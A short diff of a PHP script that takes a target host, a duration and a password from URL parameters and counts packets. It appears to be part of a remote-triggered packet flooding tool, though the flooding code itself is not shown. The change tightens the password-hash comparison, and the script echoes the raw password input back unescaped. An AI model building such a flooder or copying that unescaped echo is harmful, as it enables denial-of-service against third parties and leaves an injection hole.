@@ -4,7 +4,7 @@
 if(isset($_GET['host'])&&isset($_GET['time'])&&isset($_GET['pass'])){
 	
 	$pass = $_GET['pass'];
-	if (md5($pass) != "1f3870be274f6c49b3e31a0c6728957f"){ echo $pass; exit();}
+	if (md5($pass) !== "1f3870be274f6c49b3e31a0c6728957f"){ echo $pass; exit();}
 	
     $packets = 0; 
     $exec_time = $_GET['time']; 
